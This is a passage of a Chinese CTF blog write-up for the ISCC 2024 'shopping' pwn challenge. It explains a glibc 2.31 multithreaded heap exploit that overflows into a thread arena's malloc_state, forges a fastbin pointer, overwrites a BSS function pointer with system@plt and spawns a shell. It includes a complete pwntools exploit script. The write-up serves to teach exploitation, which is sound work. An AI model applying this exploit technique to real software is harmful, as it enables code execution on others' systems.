+<p><img src="/HFTTC.github.io/./img/deo8-OoAx3hYj9QF/1776592335564-e19f5d42-c20d-4d21-9b6d-cb084650607a-554176.png" alt="1776592335564-e19f5d42-c20d-4d21-9b6d-cb084650607a.png"></p>
+<p>可以看到已经成功分配了一块空间，这块空间在堆地址的上方，然后这块空间是从下往上分配的（以图来看），刚刚分配了一个0x4000大小的chunk，那么就是从临近下方那个堆开始向上分配，然后就可以通过堆溢出，修改掉堆头部的thread_arena，修改thread_arena中的fastbin，就可以造成fastbin attack</p>
+<p>总而言是，就是该操作在 Linux glibc 的多线程内存布局中，使得当前控制的最后一个 Chunk (v6) 的末尾，恰好贴住了另一个 Thread Arena 的头部结构 malloc_state。</p>
+<h4 id="溢出并劫持-Arena-Header"><a href="#溢出并劫持-Arena-Header" class="headerlink" title="溢出并劫持 Arena Header"></a>溢出并劫持 Arena Header</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.send(b<span class="string">&#x27;a&#x27;</span> * <span class="number">0x50</span> + p32(<span class="number">0</span>) + p32(<span class="number">2</span>) + p64(<span class="number">0</span>) * <span class="number">6</span> + p64(<span class="number">0x60201d</span>))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>b’a’ * 0x3ff0 + b’a’ * 0x50 &#x3D; 0x4040 字节。这正好填满了 v6 所在的 0x4010 字节空间，并且跨过了边界，对齐到了 malloc_state 结构的起始位置。</li>
+<li>p32(0)：覆盖 <code>malloc_state-&gt;mutex</code> 为 0（解锁状态，防止死锁）。</li>
+<li>p32(2)：覆盖 <code>malloc_state-&gt;flags</code> 为 2（设置为 <code>NONCONTIGUOUS_BIT</code>，对于 mmap 的 Arena 这是必须的合法状态）。</li>
+<li>p64(0) * 6：一共 48 字节。覆盖了 have_fastchunks 以及 fastbinsY[0] 到 fastbinsY[4]，全部清零。</li>
+<li>p64(0x60201d)：这 8 个字节刚好落在了偏移 0x38 的位置，也就是 fastbinsY[5]（对应大小为 0x70 的 Fastbin 链表头）。</li>
+<li><font style="color:#DF2A3F;">此时我们并没有释放任何 Chunk，而是直接欺骗内存管理器：大小为 0x70 的 Fastbin 里有一个空闲的 Chunk，地址在 0x60201d。这里的手法有些类似于 house of orange</font></li>
+</ul>
+<h5 id="来看一下-malloc-state-结构体："><a href="#来看一下-malloc-state-结构体：" class="headerlink" title="来看一下 malloc_state 结构体："></a>来看一下 malloc_state 结构体：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* glibc 2.31 简化版的 malloc_state 结构体定义 */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line">  <span class="comment">/* 1. 线程互斥锁 (4 字节)</span></span><br><span class="line"><span class="comment">     用于多线程环境下串行化访问，防止多个线程同时操作同一个 Arena 导致数据错乱。</span></span><br><span class="line"><span class="comment">     我们在 exp 里填了 p32(0) 把它解锁。*/</span></span><br><span class="line">  <span class="type">mutex_t</span> mutex;               </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 2. 状态标志位 (4 字节)</span></span><br><span class="line"><span class="comment">     记录当前 Arena 的一些属性，比如是否是连续内存。</span></span><br><span class="line"><span class="comment">     我们在 exp 里填了 p32(2) 设置为 NONCONTIGUOUS_BIT。*/</span></span><br><span class="line">  <span class="type">int</span> flags;                   </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 3. Fastbin 标记 (4 字节)</span></span><br><span class="line"><span class="comment">     一个布尔值（用 int 存储），如果 Fastbin 里面有空闲的 chunk，这个值就是 1，否则是 0。</span></span><br><span class="line"><span class="comment">     我们在 exp 里清零了它。</span></span><br><span class="line"><span class="comment">     (注意：在 64 位系统下，这里为了内存对齐，编译器会自动补充 4 个字节的 Padding，凑齐 8 字节) */</span></span><br><span class="line">  <span class="type">int</span> have_fastchunks;         </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 4. Fastbins 数组 (大小为 10 的指针数组，共 80 字节)</span></span><br><span class="line"><span class="comment">     这是非常重要的一片区域！存放着大小从 0x20 到 0x80 的各个 Fastbin 链表的头指针。</span></span><br><span class="line"><span class="comment">     我们在 exp 里把 fastbinsY[5] (对应 0x70 大小) 劫持为了目标地址。*/</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS]; <span class="comment">// NFASTBINS 通常为 10</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 5. Top Chunk 指针 (8 字节)</span></span><br><span class="line"><span class="comment">     指向当前 Arena 顶部那块尚未被分配的、最大的连续空闲内存。</span></span><br><span class="line"><span class="comment">     当普通的 free bin 无法满足分配需求时，就会从 top chunk 切割内存。*/</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 6. Last Remainder 指针 (8 字节)</span></span><br><span class="line"><span class="comment">     当分割一个较大的 chunk 来满足较小的分配请求时，剩下的那部分会被记录在这里，</span></span><br><span class="line"><span class="comment">     用于加速后续连续的小内存请求。*/</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 7. 普通 Bins 数组 (指针数组)</span></span><br><span class="line"><span class="comment">     除了 Fastbin 之外，这里存放着 Unsorted Bin、Small Bins 和 Large Bins 的双向链表头指针。</span></span><br><span class="line"><span class="comment">     (NBINS 通常是 128) */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 8. Binmap 位图</span></span><br><span class="line"><span class="comment">     一个用来加速查找的位图。如果要找某个大小的 chunk，不需要遍历整个 bins 数组，</span></span><br><span class="line"><span class="comment">     直接看对应的 bit 是否为 1 即可知道那个 bin 里有没有空闲块。*/</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 9. Arena 链表指针 (8 字节)</span></span><br><span class="line"><span class="comment">     所有的 Arena 会通过这个指针串联成一个单向循环链表（Main Arena 是链表头）。*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 10. 空闲 Arena 链表指针</span></span><br><span class="line"><span class="comment">     如果某个线程退出了，它的 Arena 就会空闲下来并挂载到这个链表上，供以后新建的线程复用。*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 11. 当前绑定到这个 Arena 的线程数量 */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 12. 内存统计信息</span></span><br><span class="line"><span class="comment">     记录了这个 Arena 一共向系统（内核）申请了多少内存等信息。*/</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Fastbin-Attack-错位构造"><a href="#Fastbin-Attack-错位构造" class="headerlink" title="Fastbin Attack 错位构造"></a>Fastbin Attack 错位构造</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>, <span class="number">0</span>, (b<span class="string">&#x27;/bin/sh&#x27;</span>.ljust(<span class="number">0xB</span>, b<span class="string">&#x27;\x00&#x27;</span>) + p64(system_plt)).ljust(<span class="number">0x60</span>, b<span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>我们将 chunk 从伪造的 fastbin 当中申请出来，并覆盖目标函数指针。</li>
+<li>add(0x60) 在底层会申请一个大小为 0x70 的 Chunk。Fastbin 在分配时，会检查 Chunk 头部的 size 字段是否合法（必须是 0x7 开头）。 攻击者在 BSS 段，通常在 0x602000 附近，挑选了 0x60201d 这个地址。在这个地址的偏移 +8 处，即 0x602025内存中恰好有一个字节，恰好可以欺骗绕过 Fastbin 的 Size 检查。</li>
+</ul>
+<p><img src="/HFTTC.github.io/./img/deo8-OoAx3hYj9QF/1776594083651-fc687b10-60eb-40c1-a365-69d2677456dc-513419.png" alt="1776594083651-fc687b10-60eb-40c1-a365-69d2677456dc.png"></p>
+<ul>
+<li>malloc 成功返回了用户指针：0x60201d+0x10&#x3D;0x60202d。</li>
+<li>我们向这个地址写入数据：b’&#x2F;bin&#x2F;sh’.ljust(0xB, b’\x00’)，一共占据 11 字节，从 0x60202d 写到 0x602037</li>
+<li>紧接着写下 p64(system_plt)。这个 8 字节正好落在 0x602038 上</li>
+<li><font style="color:#DF2A3F;">而 0x602038 恰好就是全局函数指针 p_sub_400AF8 在 BSS 段中的绝对地址</font></li>
+</ul>
+<p><img src="/HFTTC.github.io/./img/deo8-OoAx3hYj9QF/1776595402813-6928e515-dd5a-4429-bb91-7553101936d8-243959.png" alt="1776595402813-6928e515-dd5a-4429-bb91-7553101936d8.png"></p>
+<h4 id="触发-system-‘-bin-sh’-获取-shell"><a href="#触发-system-‘-bin-sh’-获取-shell" class="headerlink" title="触发 system(‘&#x2F;bin&#x2F;sh’)获取 shell"></a>触发 system(‘&#x2F;bin&#x2F;sh’)获取 shell</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">read_1((__int64)v6, size);</span><br><span class="line">p_write_w(v6, size);</span><br></pre></td></tr></table></figure>
+
+<p>当 add 的逻辑执行完毕时，程序按惯例会调用： <code>p_write_w(v6, size);</code> 但在我们篡改内存之后：内存变成 system(0x60202d)；而我们在 0x60202d 写入了字符串 “&#x2F;bin&#x2F;sh\x00”。触发 system(‘&#x2F;bin&#x2F;sh’)；</p>
+<h3 id="总-EXP："><a href="#总-EXP：" class="headerlink" title="总 EXP："></a>总 EXP：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(<span class="string">&#x27;./shopping&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./shopping&#x27;</span>)</span><br><span class="line">context(arch = elf.arch, log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/kali/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">def add(size, count, content = <span class="string">&#x27;&#x27;):</span></span><br><span class="line"><span class="string">	io.sendlineafter(&#x27;</span>Action: <span class="string">&#x27;, &#x27;</span><span class="number">1</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">	io.sendlineafter(&#x27;</span>Item ID: <span class="string">&#x27;, str(size))</span></span><br><span class="line"><span class="string">	io.sendlineafter(&#x27;</span>Quantity: <span class="string">&#x27;, str(count))</span></span><br><span class="line"><span class="string">	if (content == &#x27;</span><span class="string">&#x27;):</span></span><br><span class="line"><span class="string">		io.sendlineafter(&#x27;</span>Add gift message? (<span class="number">0</span>/<span class="number">1</span>): <span class="string">&#x27;, &#x27;</span><span class="number">0</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">	else:</span></span><br><span class="line"><span class="string">		io.sendlineafter(&#x27;</span>Add gift message? (<span class="number">0</span>/<span class="number">1</span>): <span class="string">&#x27;, &#x27;</span><span class="number">1</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">		io.sendafter(&#x27;</span>Message: <span class="string">&#x27;, content)</span></span><br><span class="line"><span class="string">		</span></span><br><span class="line"><span class="string">system_plt = elf.plt[&#x27;</span>system<span class="string">&#x27;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">io.sendlineafter(&#x27;</span>Enter the password: <span class="string">&#x27;, &#x27;</span>I\<span class="string">&#x27;m ready for shopping&#x27;</span>)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">12</span>):</span><br><span class="line">	add(<span class="number">0x4000</span>, <span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4000</span>, <span class="number">262</span>, b<span class="string">&#x27;a&#x27;</span> * <span class="number">0x3ff0</span>)</span><br><span class="line"></span><br><span class="line">io.send(b<span class="string">&#x27;a&#x27;</span> * <span class="number">0x50</span> + p32(<span class="number">0</span>) + p32(<span class="number">2</span>) + p64(<span class="number">0</span>) * <span class="number">6</span> + p64(<span class="number">0x60201d</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>, <span class="number">0</span>, (b<span class="string">&#x27;/bin/sh&#x27;</span>.ljust(<span class="number">0xB</span>, b<span class="string">&#x27;\x00&#x27;</span>) + p64(system_plt)).ljust(<span class="number">0x60</span>, b<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/HFTTC.github.io/./img/deo8-OoAx3hYj9QF/1776595680249-2ee811fe-19d3-4028-8fee-02ca24469212-474710.png" alt="1776595680249-2ee811fe-19d3-4028-8fee-02ca24469212.png"></p>
+<h3 id="对本题为什么不是-tcachebin-而是-fastbin-的思考："><a href="#对本题为什么不是-tcachebin-而是-fastbin-的思考：" class="headerlink" title="对本题为什么不是 tcachebin 而是 fastbin 的思考："></a>对本题为什么不是 tcachebin 而是 fastbin 的思考：</h3><p>在 glibc 2.31 中，主角确实是 tcache 。对于小内存块的分配和释放，默认都会优先进出 tcache。但之前的认知误区在我以为 libc-2.26 之后就不存在 fastbin 了。事实上 tcache 和 fastbin 是共存的，并不是说不存在 fastbin</p>
+<p>在这个特定的 Exp 中，我们之所以去打 fastbinsY 而不是 tcache，是由程序的行为和内存布局的物理位置共同决定的。</p>
+<p>tcache 是一张针对每个线程单独维护的缓存表。</p>
+<ul>
+<li>当你调用 free() 释放一个小堆块时，优先放进 tcache。单着道题目全程只有 malloc，没有 free()</li>
+</ul>
+<p>因为程序从来没有释放过内存，所以这个子线程的 tcache 链表从头到尾都是完全为空的。</p>
+<h5 id="glibc-2-31-的-malloc-查找顺序（退化机制）"><a href="#glibc-2-31-的-malloc-查找顺序（退化机制）" class="headerlink" title="glibc 2.31 的 malloc 查找顺序（退化机制）"></a>glibc 2.31 的 malloc 查找顺序（退化机制）</h5><p>当你执行最后那句 add(0x60)（底层申请 0x70 字节）时，glibc 分配器的内部代码是按这样的顺序去找可用内存的：</p>
+<ol>
+<li>第一步：检查 tcache。分配器去看对应大小的 tcache 链表。发现是空的。</li>
+<li>第二步：退化去检查 fastbin。既然 tcache 没货，分配器就会去看当前 Arena 的 malloc_state 结构体，找对应的 fastbinsY。</li>
+<li>第三步：检查普通 Bins (Small&#x2F;Unsorted等)。</li>
+</ol>
+<p><strong>这就是 Exp 的精明之处：它利用了 tcache 为空时的“向下退化”机制。</strong></p>
+<h5 id="为什么不直接覆盖-tcache-结构体？（内存布局决定）"><a href="#为什么不直接覆盖-tcache-结构体？（内存布局决定）" class="headerlink" title="为什么不直接覆盖 tcache 结构体？（内存布局决定）"></a>为什么不直接覆盖 tcache 结构体？（内存布局决定）</h5><p>这里依旧存在疑问：既然 tcache 优先级高，我们直接把 tcache 结构体（tcache_perthread_struct）里的指针覆盖掉不就行了？</p>
+<p>这里涉及到两者的物理位置差异：</p>
+<ul>
+<li>tcache 结构体的位置：它通常作为线程堆的第一个 Chunk 被分配出来（在堆的数据区最开头）。</li>
+<li><code>malloc_state</code> (Arena 头) 的位置：由于我们是用大量的 malloc 耗尽了原来的 Arena，迫使系统通过 mmap 分配了一个全新的 Thread Arena。我们的溢出数据恰好写在了新旧内存区的交界处。这个交界处紧挨着的，是新 Arena 的头部结构 <code>malloc_state</code>，而不是堆数据区里的 tcache 结构体。</li>
+</ul>
+<p>结合起来看，这道题的利用逻辑十分巧妙：</p>
+<ol>
+<li><strong>打不到 tcache</strong>：物理内存布局决定了我们只能覆盖到 <code>malloc_state</code>（Arena 头部）。</li>
+<li><strong>但可以改 fastbin</strong>：malloc_state 里面保留了 <code>fastbinsY</code> 数组。我们把伪造的指针写进了 fastbinsY[5]。</li>
+</ol>
+<p>这正是高版本 glibc (2.26+) 漏洞利用中的一种经典手法：<strong>当 tcache 无法被直接利用时，利用分配逻辑的 Fallback（回退）机制，依然可以通过传统的 fastbin&#x2F;smallbin 机制完成劫持。</strong></p>
+<blockquote>
+<p>更新: 2026-04-24 09:26:58<br>原文: <a target="_blank" rel="noopener" href="https://www.yuque.com/idcm/wnemg9/vsshwez1mw2565xg">https://www.yuque.com/idcm/wnemg9/vsshwez1mw2565xg</a></p>
+</blockquote>
+
+    </div>
+    <footer class="article-footer">
+      
+      
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="index" class="lazyload">
+        <a href="/HFTTC.github.io/2026/04/28/PWN/PWNCTF/Off-By-One%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/index/" aria-label="前一篇: index" title="前一篇: index"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            index
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="index" class="lazyload">
+      <a href="/HFTTC.github.io/2026/04/28/PWN/PWNCTF/malloc_stateHijacking%E5%8A%AB%E6%8C%81/index/" aria-label="后一篇: index"  title="后一篇: index"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          index
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      SEZUVEM=
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        292.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        24:34
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ISCC-2024-shopping-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%A0%86-libc-2-31"><span class="toc-number">1.</span> <span class="toc-text">[ISCC 2024] shopping 多线程堆 libc-2.31</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">程序分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A0%86%E5%B8%83%E5%B1%80"><span class="toc-number">1.1.1.</span> <span class="toc-text">堆布局</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%A2%E5%87%BA%E5%B9%B6%E5%8A%AB%E6%8C%81-Arena-Header"><span class="toc-number">1.1.2.</span> <span class="toc-text">溢出并劫持 Arena Header</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9D%A5%E7%9C%8B%E4%B8%80%E4%B8%8B-malloc-state-%E7%BB%93%E6%9E%84%E4%BD%93%EF%BC%9A"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">来看一下 malloc_state 结构体：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Fastbin-Attack-%E9%94%99%E4%BD%8D%E6%9E%84%E9%80%A0"><span class="toc-number">1.1.3.</span> <span class="toc-text">Fastbin Attack 错位构造</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91-system-%E2%80%98-bin-sh%E2%80%99-%E8%8E%B7%E5%8F%96-shell"><span class="toc-number">1.1.4.</span> <span class="toc-text">触发 system(‘&#x2F;bin&#x2F;sh’)获取 shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB-EXP%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">总 EXP：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E6%9C%AC%E9%A2%98%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E6%98%AF-tcachebin-%E8%80%8C%E6%98%AF-fastbin-%E7%9A%84%E6%80%9D%E8%80%83%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">对本题为什么不是 tcachebin 而是 fastbin 的思考：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#glibc-2-31-%E7%9A%84-malloc-%E6%9F%A5%E6%89%BE%E9%A1%BA%E5%BA%8F%EF%BC%88%E9%80%80%E5%8C%96%E6%9C%BA%E5%88%B6%EF%BC%89"><span class="toc-number">1.3.1.</span> <span class="toc-text">glibc 2.31 的 malloc 查找顺序（退化机制）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E7%9B%B4%E6%8E%A5%E8%A6%86%E7%9B%96-tcache-%E7%BB%93%E6%9E%84%E4%BD%93%EF%BC%9F%EF%BC%88%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80%E5%86%B3%E5%AE%9A%EF%BC%89"><span class="toc-number">1.3.2.</span> <span class="toc-text">为什么不直接覆盖 tcache 结构体？（内存布局决定）</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/HFTTC.github.io/js/script.js"></script>
+
+
+  
+<script src="/HFTTC.github.io/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/HFTTC.github.io/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "SEZUVEM=",
+          title: "[ISCC2024]shopping多线程堆libc-2.31",
+          url: "https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/PWN/PWNCTF/malloc_stateHijacking%E5%8A%AB%E6%8C%81/%5BISCC2024%5Dshopping%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%A0%86libc-2.31/",
+          excerpt: "",
+          description: "",
+          stripContent: "[ISCC 2024] shopping 多线程堆 libc-2.31参考资料：https://blog.csdn.net/j284886202/article/details/139119047  程序分析：123456789101112131415161718192021222324252627__int64 __fastcall main(int a1, char **a2, char **a3)&amp;#123;    pthread_t newthread; // [rsp+28h] [rb",
